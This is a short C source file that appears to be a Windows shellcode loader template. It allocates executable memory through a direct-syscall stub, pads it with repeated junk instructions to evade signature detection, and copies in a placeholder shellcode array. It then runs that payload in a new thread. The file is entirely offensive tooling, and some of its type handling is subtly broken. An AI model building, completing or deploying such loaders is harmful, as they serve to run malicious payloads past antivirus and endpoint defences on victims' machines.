#include <windows.h>

#define SHELLCODE_SIZE 0
#define JUNKCODE_SIZE 0


NTSTATUS _sysNtAllocVirtMem(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PULONG RegionSize,
    ULONG AllocationType,
    ULONG Protect
);


int main(int argc, char* argv[])
{
    HANDLE currentProccess = GetCurrentProcess();
    char* baseAddress = NULL;
    PULONG regionSize = SHELLCODE_SIZE;
    NTSTATUS success = _sysNtAllocVirtMem(
        currentProccess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    unsigned char shellcode[] = {
        //SHELLCODE HERE
    };

    char* junkcode = malloc(sizeof(char) * (JUNKCODE_SIZE + 1 ));
    for (int i = 0; i < JUNKCODE_SIZE; i += 2) {
        junkcode[i] = 0x89;
        junkcode[i + 1] = 0xc0;
    }

    CopyMemory(
        baseAddress,
        junkcode,
        JUNKCODE_SIZE
    );

    free(junkcode);

    CopyMemory(
        baseAddress + JUNKCODE_SIZE,
        shellcode,
        SHELLCODE_SIZE
    );
    
    
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)baseAddress,
        NULL,    
        0,       
        0
    );


    WaitForSingleObject(hThread, INFINITE);

    return 0;
}